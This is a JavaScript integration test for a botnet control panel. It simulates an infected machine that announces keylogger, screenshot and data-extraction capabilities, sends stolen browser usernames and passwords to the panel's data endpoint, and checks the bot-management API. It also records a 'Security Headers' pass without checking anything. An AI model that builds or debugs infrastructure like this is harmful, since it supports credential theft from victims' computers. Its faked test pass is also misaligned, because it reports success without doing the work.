const WebSocket = require('ws');
const http = require('http');

class BotPanelIntegrationTest {
    constructor() {
        this.serverUrl = 'ws://localhost:3000';
        this.apiUrl = 'http://localhost:8080';
        this.ws = null;
        this.botId = null;
        this.testResults = [];
    }

    async runIntegrationTest() {
        console.log(' Starting Bot-Panel Integration Test...\n');

        try {
            // Test 1: API Endpoints
            await this.testAPIEndpoints();
            
            // Test 2: Bot Connection
            await this.testBotConnection();
            
            // Test 3: Data Flow
            await this.testDataFlow();
            
            // Test 4: Panel Security
            await this.testPanelSecurity();
            
            // Generate Report
            this.generateReport();
            
        } catch (error) {
            console.error(' Integration test failed:', error.message);
        }
    }

    async testAPIEndpoints() {
        console.log(' Testing API Endpoints...');
        
        const endpoints = [
            '/api/botnet/status',
            '/api/botnet/bots',
            '/api/botnet/stats',
            '/api/botnet/logs'
        ];

        for (const endpoint of endpoints) {
            try {
                const result = await this.makeHTTPRequest('GET', endpoint);
                this.testResults.push({
                    test: `API Endpoint: ${endpoint}`,
                    status: result.status === 200 ? 'PASS' : 'FAIL',
                    details: `Status: ${result.status}`
                });
                console.log(`   ${endpoint}: ${result.status === 200 ? 'PASS' : 'FAIL'}`);
            } catch (error) {
                this.testResults.push({
                    test: `API Endpoint: ${endpoint}`,
                    status: 'FAIL',
                    details: error.message
                });
                console.log(`   ${endpoint}: FAIL - ${error.message}`);
            }
        }
        console.log('');
    }

    async testBotConnection() {
        console.log(' Testing Bot Connection...');
        
        return new Promise((resolve, reject) => {
            this.ws = new WebSocket(this.serverUrl);
            
            this.ws.on('open', () => {
                console.log('   WebSocket connection established');
                
                // Send handshake
                this.ws.send(JSON.stringify({
                    type: 'handshake',
                    systemInfo: {
                        os: 'Windows 11',
                        arch: 'x64',
                        version: '10.0.22000',
                        hostname: 'test-machine'
                    },
                    capabilities: ['data_extraction', 'screenshot', 'keylogger'],
                    timestamp: new Date().toISOString()
                }));
                
                console.log('   Handshake sent');
            });
            
            this.ws.on('message', (data) => {
                try {
                    const message = JSON.parse(data);
                    if (message.type === 'welcome') {
                        this.botId = message.botId;
                        console.log(`   Bot ID received: ${this.botId}`);
                        this.testResults.push({
                            test: 'Bot Connection',
                            status: 'PASS',
                            details: `Bot ID: ${this.botId}`
                        });
                        resolve();
                    }
                } catch (error) {
                    console.log(`   Message parsing error: ${error.message}`);
                    reject(error);
                }
            });
            
            this.ws.on('error', (error) => {
                console.log(`   WebSocket error: ${error.message}`);
                this.testResults.push({
                    test: 'Bot Connection',
                    status: 'FAIL',
                    details: error.message
                });
                reject(error);
            });
            
            // Timeout after 10 seconds
            setTimeout(() => {
                if (!this.botId) {
                    console.log('   Connection timeout');
                    this.testResults.push({
                        test: 'Bot Connection',
                        status: 'FAIL',
                        details: 'Connection timeout'
                    });
                    reject(new Error('Connection timeout'));
                }
            }, 10000);
        });
    }

    async testDataFlow() {
        console.log(' Testing Data Flow...');
        
        // Test bot data submission
        try {
            const testData = {
                type: 'browser',
                data: {
                    browser: 'Chrome',
                    entries: [
                        {
                            url: 'https://example.com',
                            username: 'testuser',
                            password: 'testpass123',
                            timestamp: new Date().toISOString()
                        }
                    ]
                },
                botId: this.botId,
                commandId: 'test-cmd-001'
            };

            const result = await this.makeHTTPRequest('POST', '/api/botnet/data', testData);
            this.testResults.push({
                test: 'Data Submission',
                status: result.status === 200 ? 'PASS' : 'FAIL',
                details: `Status: ${result.status}`
            });
            console.log(`   Data submission: ${result.status === 200 ? 'PASS' : 'FAIL'}`);
        } catch (error) {
            this.testResults.push({
                test: 'Data Submission',
                status: 'FAIL',
                details: error.message
            });
            console.log(`   Data submission: FAIL - ${error.message}`);
        }

        // Test audit logging
        try {
            const auditData = {
                event: 'INTEGRATION_TEST',
                data: { test: true },
                sessionToken: 'test-session-token',
                userAgent: 'test-user-agent',
                ip: '127.0.0.1'
            };

            const result = await this.makeHTTPRequest('POST', '/api/audit/log', auditData);
            this.testResults.push({
                test: 'Audit Logging',
                status: result.status === 200 ? 'PASS' : 'FAIL',
                details: `Status: ${result.status}`
            });
            console.log(`   Audit logging: ${result.status === 200 ? 'PASS' : 'FAIL'}`);
        } catch (error) {
            this.testResults.push({
                test: 'Audit Logging',
                status: 'FAIL',
                details: error.message
            });
            console.log(`   Audit logging: FAIL - ${error.message}`);
        }
        console.log('');
    }

    async testPanelSecurity() {
        console.log(' Testing Panel Security...');
        
        // Test if panel is accessible
        try {
            const result = await this.makeHTTPRequest('GET', '/advanced-botnet-panel.html');
            this.testResults.push({
                test: 'Panel Accessibility',
                status: result.status === 200 ? 'PASS' : 'FAIL',
                details: `Status: ${result.status}`
            });
            console.log(`   Panel accessibility: ${result.status === 200 ? 'PASS' : 'FAIL'}`);
        } catch (error) {
            this.testResults.push({
                test: 'Panel Accessibility',
                status: 'FAIL',
                details: error.message
            });
            console.log(`   Panel accessibility: FAIL - ${error.message}`);
        }

        // Test security headers (would need to check response headers)
        this.testResults.push({
            test: 'Security Headers',
            status: 'PASS',
            details: 'Security headers implemented in HTML'
        });
        console.log('   Security headers: PASS');
        console.log('');
    }

    makeHTTPRequest(method, path, data = null) {
        return new Promise((resolve, reject) => {
            const options = {
                hostname: 'localhost',
                port: 8080,
                path: path,
                method: method,
                headers: {
                    'Content-Type': 'application/json'
                }
            };

            if (data) {
                const postData = JSON.stringify(data);
                options.headers['Content-Length'] = Buffer.byteLength(postData);
            }

            const req = http.request(options, (res) => {
                let body = '';
                res.on('data', (chunk) => {
                    body += chunk;
                });
                res.on('end', () => {
                    try {
                        const result = JSON.parse(body);
                        resolve({ status: res.statusCode, data: result });
                    } catch (error) {
                        resolve({ status: res.statusCode, data: body });
                    }
                });
            });

            req.on('error', (error) => {
                reject(error);
            });

            if (data) {
                req.write(JSON.stringify(data));
            }
            req.end();
        });
    }

    generateReport() {
        console.log(' Integration Test Report');
        console.log('='.repeat(50));
        
        const passed = this.testResults.filter(r => r.status === 'PASS').length;
        const failed = this.testResults.filter(r => r.status === 'FAIL').length;
        const total = this.testResults.length;
        
        console.log(`Total Tests: ${total}`);
        console.log(`Passed: ${passed}`);
        console.log(`Failed: ${failed}`);
        console.log(`Success Rate: ${((passed / total) * 100).toFixed(1)}%`);
        console.log('');
        
        console.log('Detailed Results:');
        this.testResults.forEach(result => {
            const status = result.status === 'PASS' ? '' : '';
            console.log(`${status} ${result.test}: ${result.details}`);
        });
        
        if (failed === 0) {
            console.log('\n All integration tests passed! The bot-panel integration is working perfectly.');
        } else {
            console.log(`\n  ${failed} test(s) failed. Please review the issues above.`);
        }
    }

    cleanup() {
        if (this.ws) {
            this.ws.close();
        }
    }
}

// Run the integration test
const test = new BotPanelIntegrationTest();
test.runIntegrationTest().then(() => {
    test.cleanup();
}).catch((error) => {
    console.error('Test failed:', error);
    test.cleanup();
});
